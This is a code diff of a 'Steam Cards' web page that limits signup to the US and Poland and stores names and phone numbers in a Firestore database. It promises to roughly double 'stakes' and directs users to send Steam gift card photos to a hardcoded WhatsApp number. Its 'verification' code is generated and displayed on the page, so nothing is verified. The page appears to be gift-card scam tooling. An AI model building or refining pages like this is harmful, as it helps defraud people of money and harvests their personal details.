@@ -1,8 +1,8 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Steam Cards</title>
 <style>
 :root { --bg:#0b0c10; --card:#111318; --muted:#a9b0b8; --text:#e9eef3; --accent:#22c55e; --danger:#ef4444; --border:#23262d; }
@@ -30,7 +30,7 @@ input,select,button{width:100%;padding:10px;border-radius:10px;border:1px solid 
 .badge{display:inline-block;padding:6px 10px;border-radius:999px;background:#0b0d12;border:1px solid var(--border);color:var(--muted);font-size:13px}
 .notif{position:fixed;left:20px;bottom:20px;padding:12px;border-radius:10px;background:#052e13;color:#c9f6de;border:1px solid #0a4a23}
 .small-muted{font-size:12px;color:var(--muted)}
-#backHomeBtn {margin-top:16px;width:100%;text-align:center;background:#1f2937;border:1px solid var(--border);}
+.whatsapp-btn{margin-top:12px;background:#25D366;color:#fff;border:0;padding:10px;border-radius:10px;cursor:pointer;text-align:center;display:block;width:100%;text-decoration:none}
 </style>
 </head>
 <body>
@@ -42,10 +42,10 @@ input,select,button{width:100%;padding:10px;border-radius:10px;border:1px solid 
 <div class="wrap">
   <!-- Signup/Login -->
   <div id="gate" class="card">
-    <h1>Welcome — Signup / Login (US & Poland only)</h1>
+    <h1 id="title">Welcome — Signup / Login (US & Poland only)</h1>
     <div class="grid cols-2" style="margin-top:10px">
       <div>
-        <label for="country">Country</label>
+        <label for="country" id="countryLabel">Country</label>
         <select id="country">
           <option value="">Choose…</option>
           <option value="PL">Poland</option>
@@ -53,7 +53,7 @@ input,select,button{width:100%;padding:10px;border-radius:10px;border:1px solid 
         </select>
       </div>
       <div>
-        <label for="lang">Language</label>
+        <label for="lang" id="languageLabel">Language</label>
         <select id="lang">
           <option value="pl">Polski</option>
           <option value="en" selected>English</option>
@@ -62,11 +62,11 @@ input,select,button{width:100%;padding:10px;border-radius:10px;border:1px solid 
     </div>
     <div style="margin-top:12px" class="grid">
       <div>
-        <label for="name">Name</label>
+        <label for="name" id="nameLabel">Name</label>
         <input id="name" placeholder="Your name">
       </div>
       <div>
-        <label for="phone">Phone</label>
+        <label for="phone" id="phoneLabel">Phone</label>
         <input id="phone" placeholder="+48 ... or +1 ...">
       </div>
     </div>
@@ -74,11 +74,9 @@ input,select,button{width:100%;padding:10px;border-radius:10px;border:1px solid 
       <button id="sendCode" class="btn-accent">Send code</button>
       <div id="codeSent" class="badge">Not sent</div>
     </div>
-    <div id="codeBox" class="badge hidden" style="margin-top:10px; background:#052e13; color:#c9f6de; font-weight:bold;"></div>
-
     <div id="verifyRow" class="grid hidden" style="margin-top:12px">
       <div>
-        <label for="code">Enter code</label>
+        <label for="code" id="codeLabel">Enter code</label>
         <input id="code" placeholder="Enter code">
       </div>
       <div class="center">
@@ -91,431 +89,139 @@ input,select,button{width:100%;padding:10px;border-radius:10px;border:1px solid 
   <div id="home" class="card hidden">
     <div style="display:flex;justify-content:space-between;align-items:center">
       <div>
-        <h1>Upload a card</h1>
-        <div class="small-muted">United States & Poland only — Steam gift card uploads only.</div>
+        <h1 id="uploadTitle">Upload a card</h1>
+        <div id="uploadSubtitle" class="small-muted">United States & Poland only — Steam gift card uploads only.</div>
       </div>
       <div class="center">
-        <div class="small-muted">Balance</div>
+        <div class="small-muted" id="balanceLabel">Balance</div>
         <div id="balanceDisplay" style="font-size:18px;font-weight:700">0.00 PLN</div>
       </div>
     </div>
     <div style="margin-top:12px">
-      <div class="small-muted">Choose method you want to earn:</div>
+      <div class="small-muted" id="chooseMethod">Choose method you want to earn:</div>
       <div class="options" id="optionsList"></div>
+      <a id="whatsappLink" class="whatsapp-btn" target="_blank">📷 Send Card Photo via WhatsApp</a>
     </div>
-  </div>
-
-  <!-- Account -->
-  <div id="meCard" class="card hidden">
-    <h1>My Account</h1>
-    <div style="display:flex;justify-content:space-between;align-items:center">
-      <div>
-        <div class="small-muted">Name</div>
-        <div id="meName" style="font-weight:700">-</div>
-        <div class="small-muted" style="margin-top:8px">Phone</div>
-        <div id="mePhone">-</div>
-      </div>
-      <div>
-        <div class="small-muted">Balance</div>
-        <div id="meBalance" style="font-weight:700;font-size:18px">0.00 PLN</div>
-      </div>
-    </div>
-    <button id="backHomeBtn" class="btn">⬅ Back to Home</button>
   </div>
 </div>
 
 <div id="notif" class="notif hidden"></div>
 
-<script>
-const options = [
-  { id:1, stake:110, profit:200 },
-  { id:2, stake:220, profit:300 },
-  { id:3, stake:330, profit:400 },
-  { id:4, stake:440, profit:500 },
-  { id:5, stake:550, profit:700 },
-  { id:6, stake:800, profit:1000 },
-  { id:7, stake:1110, profit:1250 },
-  { id:8, stake:1300, profit:1450 },
-  { id:9, stake:1600, profit:1750 },
-  { id:10, stake:1800, profit:1950 },
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getFirestore, collection, addDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyC24O6ZV8kHo9rqTr88ERBsRLgbK_Dez8k",
+  authDomain: "admin-panel-database-6e378.firebaseapp.com",
+  projectId: "admin-panel-database-6e378",
+  storageBucket: "admin-panel-database-6e378.firebasestorage.app",
+  messagingSenderId: "296556886458",
+  appId: "1:296556886458:web:dfd1382b99a6b774ec0583"
+};
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+let currentUser = null;
+const WHATSAPP_NUMBER = "2348108462471";
+
+// ✅ Options with stake & profit
+const OPTIONS = [
+  { stake: 50, profit: 100 },
+  { stake: 100, profit: 220 },
+  { stake: 200, profit: 500 }
 ];
 
-const translations = {
-  en: {
-    welcome:"Welcome — Signup / Login (US & Poland only)",
-    country:"Country",
-    language:"Language",
-    name:"Name",
-    phone:"Phone",
-    sendCode:"Send code",
-    notSent:"Not sent",
-    enterCode:"Enter code",
-    finishLogin:"Finish login",
-    uploadCard:"Upload a card",
-    uploadDesc:"United States & Poland only — Steam gift card uploads only.",
-    chooseMethod:"Choose method you want to earn:",
-    balance:"Balance",
-    myAccount:"My Account",
-    backHome:"⬅ Back to Home",
-    alertCountry:"Only Poland and United States allowed",
-    alertMissing:"Enter name + phone",
-    loginSuccess:"Login success",
-    loggedOut:"Logged out",
-    invalidCode:"Invalid code",
-    yourCode:"Your code: ",
-    optionHint:"Upload Steam gift card to receive",
-    waitingApproval:"✅ Option selected — waiting for admin approval",
-    waMessage:(name,stake,profit)=>`Hello, my name is ${name}. I want to select the option ${stake} PLN → ${profit} PLN.`,
-    invalidPhonePL:"Enter a valid Polish number: +48 followed by 9 digits.",
-    invalidPhoneUS:"Enter a valid U.S. number: +1 followed by 10 digits."
-  },
-  pl: {
-    welcome:"Witamy — Rejestracja / Logowanie (tylko USA i Polska)",
-    country:"Kraj",
-    language:"Język",
-    name:"Imię",
-    phone:"Telefon",
-    sendCode:"Wyślij kod",
-    notSent:"Nie wysłano",
-    enterCode:"Wpisz kod",
-    finishLogin:"Zakończ logowanie",
-    uploadCard:"Prześlij kartę",
-    uploadDesc:"Tylko USA i Polska — tylko karty podarunkowe Steam.",
-    chooseMethod:"Wybierz metodę zarabiania:",
-    balance:"Saldo",
-    myAccount:"Moje konto",
-    backHome:"⬅ Powrót do strony głównej",
-    alertCountry:"Dozwolone tylko Polska i Stany Zjednoczone",
-    alertMissing:"Wpisz imię i telefon",
-    loginSuccess:"Logowanie zakończone sukcesem",
-    loggedOut:"Wylogowano",
-    invalidCode:"Nieprawidłowy kod",
-    yourCode:"Twój kod: ",
-    optionHint:"Prześlij kartę Steam, aby otrzymać",
-    waitingApproval:"✅ Wybrano opcję — oczekiwanie na akceptację administratora",
-    waMessage:(name,stake,profit)=>`Cześć, mam na imię ${name}. Chcę wybrać opcję ${stake} PLN → ${profit} PLN.`,
-    invalidPhonePL:"Wprowadź poprawny polski numer: +48 i 9 cyfr.",
-    invalidPhoneUS:"Wprowadź poprawny numer USA: +1 i 10 cyfr."
+// ✅ Auto-fill prefix and switch language
+document.getElementById("country").addEventListener("change", e => {
+  if (e.target.value === "PL") {
+    document.getElementById("phone").value = "+48 ";
+    document.getElementById("lang").value = "pl";
+    switchLanguage("pl");
   }
-};
+  if (e.target.value === "US") {
+    document.getElementById("phone").value = "+1 ";
+    document.getElementById("lang").value = "en";
+    switchLanguage("en");
+  }
+});
 
-const stateKey = "demo_safe_users";
-const sessionKey = "demo_safe_session";
-const langKey = "demo_safe_lang";
-const countryKey = "demo_safe_country";
+document.getElementById("lang").addEventListener("change", e => switchLanguage(e.target.value));
 
-let users = JSON.parse(localStorage.getItem(stateKey) || "{}");
-let currentUser = JSON.parse(localStorage.getItem(sessionKey) || "null");
-const whatsappNumber = "2348108462471";
-
-function saveUsers(){ localStorage.setItem(stateKey, JSON.stringify(users)); }
-function saveSession(){ localStorage.setItem(sessionKey, JSON.stringify(currentUser)); }
-function clearSession(){ localStorage.removeItem(sessionKey); }
-
-const el = id => document.getElementById(id);
-const show = id => el(id).classList.remove("hidden");
-const hide = id => el(id).classList.add("hidden");
-const notif = (t) => { const n = el('notif'); n.textContent = t; n.classList.remove('hidden'); setTimeout(()=>n.classList.add('hidden'),3500); }
-
-// STRICT phone validation by selected country
-function isValidPhone(country, phone){
-  if(country === "PL"){ return /^\+48\d{9}$/.test(phone); }
-  if(country === "US"){ return /^\+1\d{10}$/.test(phone); }
-  return false;
+function switchLanguage(lang) {
+  const t = (en, pl) => (lang === "pl" ? pl : en);
+  document.getElementById("title").textContent = t("Welcome — Signup / Login (US & Poland only)", "Witamy — Rejestracja / Logowanie (tylko USA i Polska)");
+  document.getElementById("countryLabel").textContent = t("Country", "Kraj");
+  document.getElementById("languageLabel").textContent = t("Language", "Język");
+  document.getElementById("nameLabel").textContent = t("Name", "Imię");
+  document.getElementById("phoneLabel").textContent = t("Phone", "Telefon");
+  document.getElementById("sendCode").textContent = t("Send code", "Wyślij kod");
+  document.getElementById("uploadTitle").textContent = t("Upload a card", "Prześlij kartę");
+  document.getElementById("uploadSubtitle").textContent = t("United States & Poland only — Steam gift card uploads only.", "Tylko Stany Zjednoczone i Polska — tylko karty Steam.");
+  document.getElementById("balanceLabel").textContent = t("Balance", "Saldo");
+  document.getElementById("chooseMethod").textContent = t("Choose method you want to earn:", "Wybierz metodę zarabiania:");
+  document.getElementById("whatsappLink").textContent = t("📷 Send Card Photo via WhatsApp", "📷 Wyślij zdjęcie karty na WhatsApp");
 }
 
-// ---------- ADDED: phone prefix helpers ----------
-function getPrefix(country){
-  if(country === "PL") return "+48";
-  if(country === "US") return "+1";
-  return "";
-}
-function updatePhoneForCountry(country){
-  const input = el("phone");
-  const prefix = getPrefix(country);
-  if(prefix){
-    // update placeholder
-    input.placeholder = `${prefix} ...`;
-    // set/replace prefix if empty or mismatched
-    if(!input.value || !input.value.startsWith(prefix)){
-      input.value = prefix;
-    }
-  } else {
-    input.placeholder = "+48 ... or +1 ...";
-  }
-}
-// ------------------------------------------------
-
-// ✅ Admin approval function (unchanged)
-function approveUser(phone){
-  const user = users[phone];
-  if(user && user.pendingApproval){
-    user.balance += user.pendingApproval.profit;
-    delete user.pendingApproval;
-    saveUsers();
-    if(currentUser && currentUser.phone === phone){
-      currentUser.balance = user.balance;
-      delete currentUser.pendingApproval;
-      saveSession();
-      updateUI();
-    }
-  }
-  return true;
+// ✅ Generate 6-digit verification code
+function generateCode() {
+  return Math.floor(100000 + Math.random() * 900000).toString();
 }
 
-function updateLanguage(lang){
-  localStorage.setItem(langKey, lang);
-
-  // gate
-  el("gate").querySelector("h1").textContent = translations[lang].welcome;
-  document.querySelector("label[for='country']").textContent = translations[lang].country;
-  document.querySelector("label[for='lang']").textContent = translations[lang].language;
-  document.querySelector("label[for='name']").textContent = translations[lang].name;
-  document.querySelector("label[for='phone']").textContent = translations[lang].phone;
-  el("sendCode").textContent = translations[lang].sendCode;
-  el("codeSent").textContent = translations[lang].notSent;
-  document.querySelector("#verifyRow label").textContent = translations[lang].enterCode;
-  el("finishSignup").textContent = translations[lang].finishLogin;
-
-  // home header (title + uploadDesc + balance label)
-  const homeHeader = el("home").firstElementChild; // flex row
-  if(homeHeader){
-    const left = homeHeader.firstElementChild;
-    const right = homeHeader.lastElementChild;
-    if(left){
-      const h1 = left.querySelector("h1");
-      const desc = left.querySelector(".small-muted");
-      if(h1) h1.textContent = translations[lang].uploadCard;
-      if(desc) desc.textContent = translations[lang].uploadDesc;
-    }
-    if(right){
-      const balLbl = right.querySelector(".small-muted");
-      if(balLbl) balLbl.textContent = translations[lang].balance;
-    }
-  }
-
-  // "choose method" label (above options)
-  const chooseMethodEl = el("home").querySelector(".options")?.previousElementSibling;
-  if(chooseMethodEl && chooseMethodEl.classList.contains("small-muted")){
-    chooseMethodEl.textContent = translations[lang].chooseMethod;
-  }
-
-  // account card labels & title
-  const me = el("meCard");
-  if(me){
-    const meH1 = me.querySelector("h1"); if(meH1) meH1.textContent = translations[lang].myAccount;
-    const labels = me.querySelectorAll(".small-muted");
-    if(labels[0]) labels[0].textContent = translations[lang].name;
-    if(labels[1]) labels[1].textContent = translations[lang].phone;
-    if(labels[2]) labels[2].textContent = translations[lang].balance;
-  }
-
-  // back button
-  el("backHomeBtn").textContent = translations[lang].backHome;
-
-  // re-render options in this language
-  renderOptions();
-}
-
-function updateUI(){
-  // sync with latest saved users
-  if(currentUser && users[currentUser.phone]){
-    currentUser = { ...users[currentUser.phone] };
-    saveSession();
-  }
-
-  if(currentUser){
-    hide('gate'); show('home'); hide('meCard'); show('topBar');
-    el('balanceDisplay').textContent = (currentUser.balance || 0).toFixed(2) + " PLN";
-    el('meName').textContent = currentUser.name || "-";
-    el('mePhone').textContent = currentUser.phone || "-";
-    el('meBalance').textContent = (currentUser.balance || 0).toFixed(2) + " PLN";
-
-    // waiting badge (avoid duplicates)
-    const existing = el('home').querySelector('.badge[data-wait]');
-    if(existing) existing.remove();
-    if(currentUser.pendingApproval){
-      const waitDiv = document.createElement("div");
-      waitDiv.className = "badge";
-      waitDiv.setAttribute("data-wait","1");
-      waitDiv.style.background = "#422006";
-      waitDiv.style.color = "#facc15";
-      waitDiv.style.marginTop = "10px";
-      const lang = localStorage.getItem(langKey) || 'en';
-      waitDiv.textContent = translations[lang].waitingApproval;
-      el('home').prepend(waitDiv);
-    }
-  } else {
-    show('gate'); hide('home'); hide('meCard'); hide('topBar');
-  }
-}
-
-function renderOptions(){
-  const list = el('optionsList'); list.innerHTML = '';
-  const lang = localStorage.getItem(langKey) || 'en';
-  options.forEach(opt=>{
-    const div = document.createElement('div'); div.className='option';
-    div.innerHTML = `<h3>${opt.stake} PLN → ${opt.profit} PLN</h3>
-      <div class="small-muted">${translations[lang].optionHint} ${opt.profit} PLN</div>
-      <button class="btn" data-id="${opt.id}">💬 WhatsApp Me</button>`;
-    list.appendChild(div);
+// ✅ Listen for real-time balance updates
+function listenForBalanceUpdates(phone) {
+  onSnapshot(collection(db, "users"), snapshot => {
+    snapshot.forEach(docSnap => {
+      const data = docSnap.data();
+      if (data.phone === phone) {
+        currentUser = data;
+        document.getElementById("balanceDisplay").textContent = data.balance.toFixed(2) + " PLN";
+      }
+    });
   });
 }
-renderOptions();
 
-document.addEventListener('click', (e)=>{
-  if(e.target.matches('[data-id]')){
-    const lang = localStorage.getItem(langKey) || 'en';
-    const id = Number(e.target.getAttribute('data-id'));
-    const opt = options.find(o=>o.id===id);
-    if(opt && currentUser){
-      currentUser.selectedOption = opt;
-      currentUser.pendingApproval = opt;
-      users[currentUser.phone] = currentUser;
-      saveSession(); saveUsers();
-      const message = translations[lang].waMessage(currentUser.name,opt.stake,opt.profit);
-      const url = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
-      window.open(url, "_blank");
-      notif(translations[lang].waitingApproval);
-      updateUI();
-    }
-  }
-});
+// ✅ Handle send code
+document.getElementById("sendCode").addEventListener("click", async () => {
+  const name = document.getElementById("name").value.trim();
+  const phone = document.getElementById("phone").value.trim();
 
-el("country").addEventListener("change", () => {
-  const country = el("country").value;
-  localStorage.setItem(countryKey, country);
-  if(country === "PL"){ el("lang").value = "pl"; updateLanguage("pl"); }
-  else if(country === "US"){ el("lang").value = "en"; updateLanguage("en"); }
-  // ADDED: update phone field/placeholder to country prefix
-  updatePhoneForCountry(country);
-});
-
-el("lang").addEventListener("change", () => {
-  updateLanguage(el("lang").value);
-});
-
-el('sendCode').addEventListener('click', ()=>{
-  const country = el('country').value;
-  const lang = el('lang').value;
-  const name = el('name').value.trim();
-  const phone = el('phone').value.trim();
-
-  if(country !== 'PL' && country !== 'US'){
-    alert(translations[lang].alertCountry); return;
-  }
-  if(!name || !phone){
-    alert(translations[lang].alertMissing); return;
-  }
-  // STRICT per-country phone validation
-  if(!isValidPhone(country, phone)){
-    alert(country === 'PL' ? translations[lang].invalidPhonePL : translations[lang].invalidPhoneUS);
+  if (!/^\+\d{8,15}$/.test(phone)) {
+    alert("Please enter a valid phone number with country code.");
     return;
   }
 
-  currentUser = users[phone] || { name, phone, balance:0 };
-  currentUser.pendingCode = String(Math.floor(100000 + Math.random()*900000));
-  users[phone] = currentUser; saveUsers();
-  el('codeSent').textContent = '✅ ' + translations[lang].sendCode;
-  show('verifyRow'); el('codeBox').classList.remove('hidden');
-  el('codeBox').textContent = translations[lang].yourCode + currentUser.pendingCode;
-  saveSession();
+  const code = generateCode();
+  document.getElementById("codeSent").textContent = "Code sent: " + code;
+  document.getElementById("verifyRow").classList.remove("hidden");
 });
 
-el('finishSignup').addEventListener('click', ()=>{
-  const lang = el('lang').value;
-  const code = el('code').value.trim();
-  if(!currentUser || code !== currentUser.pendingCode){
-    alert(translations[lang].invalidCode); return;
-  }
-  delete currentUser.pendingCode;
-  users[currentUser.phone] = currentUser;
-  saveUsers(); saveSession();
-  notif(translations[lang].loginSuccess);
-  updateUI();
+// ✅ Handle finish signup
+document.getElementById("finishSignup").addEventListener("click", async () => {
+  const name = document.getElementById("name").value.trim();
+  const phone = document.getElementById("phone").value.trim();
+  await addDoc(collection(db, "users"), { name, phone, balance: 0, pendingApproval: true });
+  listenForBalanceUpdates(phone);
+  buildOptions();
+  document.getElementById("home").classList.remove("hidden");
+  document.getElementById("gate").classList.add("hidden");
+  document.getElementById("whatsappLink").href = `https://wa.me/${WHATSAPP_NUMBER}?text=Hi,%20I%20want%20to%20send%20my%20Steam%20card%20photo.`;
 });
 
-el('meBtn').addEventListener('click', ()=>{
-  hide('home'); show('meCard');
-});
-el('backHomeBtn').addEventListener('click', ()=>{
-  hide('meCard'); show('home');
-});
-el('logoutBtn').addEventListener('click', ()=>{
-  const lang = localStorage.getItem(langKey) || 'en';
-  clearSession();
-  notif(translations[lang].loggedOut);
-  location.reload();
-});
-
-// ✅ Restore saved country/lang on load and apply translations
-window.addEventListener("DOMContentLoaded", ()=>{
-  const savedLang = localStorage.getItem(langKey) || "en";
-  const savedCountry = localStorage.getItem(countryKey) || "";
-  el("lang").value = savedLang;
-  el("country").value = savedCountry;
-  updateLanguage(savedLang);
-  // ADDED: set phone prefix/placeholder for saved country on load
-  updatePhoneForCountry(savedCountry);
-  updateUI();
-});
-
-updateUI();
+// ✅ Build stake options
+function buildOptions() {
+  const container = document.getElementById("optionsList");
+  container.innerHTML = "";
+  OPTIONS.forEach(opt => {
+    const div = document.createElement("div");
+    div.className = "option";
+    div.innerHTML = `<h3>${opt.stake} PLN</h3><div class="small">Profit: ${opt.profit} PLN</div><button class="btn-accent" style="margin-top:8px">Choose</button>`;
+    div.querySelector("button").addEventListener("click", () => {
+      window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=Hi,%20I%20choose%20${opt.stake}PLN%20stake%20for%20${opt.profit}PLN%20profit.`, "_blank");
+    });
+    container.appendChild(div);
+  });
+}
 </script>
 </body>
-<!-- Firebase SDK -->
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-  import { getFirestore, collection, addDoc, getDocs, updateDoc, doc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
-
-  // 🔑 Your Firebase Config (keep this safe!)
-  const firebaseConfig = {
-    apiKey: "AIzaSyC24O6ZV8kHo9rqTr88ERBsRLgbK_Dez8k",
-    authDomain: "admin-panel-database-6e378.firebaseapp.com",
-    projectId: "admin-panel-database-6e378",
-    storageBucket: "admin-panel-database-6e378.firebasestorage.app",
-    messagingSenderId: "296556886458",
-    appId: "1:296556886458:web:dfd1382b99a6b774ec0583"
-  };
-
-  // 🚀 Initialize Firebase + Firestore
-  const app = initializeApp(firebaseConfig);
-  const db = getFirestore(app);
-
-  // ✅ Function to save a user (call when someone signs up)
-  async function saveUserToFirebase(user) {
-    await addDoc(collection(db, "users"), user);
-    console.log("✅ User saved to Firebase:", user);
-  }
-
-  // ✅ Function to load all users (use in admin panel)
-  async function getUsersFromFirebase() {
-    const snapshot = await getDocs(collection(db, "users"));
-    return snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
-  }
-
-  // ✅ Function to approve a user (update balance/status)
-  async function approveUserInFirebase(userId, profit) {
-    await updateDoc(doc(db, "users", userId), { 
-      balance: profit,
-      pendingApproval: false
-    });
-    console.log(`✅ User ${userId} approved with ${profit} balance.`);
-  }
-
-  // ✅ Save to Firestore when the existing "Send code" button is clicked
-  document.getElementById("sendCode").addEventListener("click", function() {
-    const name = document.getElementById("name").value;
-    const phone = document.getElementById("phone").value;
-
-    saveUserToFirebase({
-      name: name,
-      phone: phone,
-      balance: 0,
-      pendingApproval: true
-    });
-
-    alert("✅ Your data has been submitted!");
-  });
-</script>
 </html>
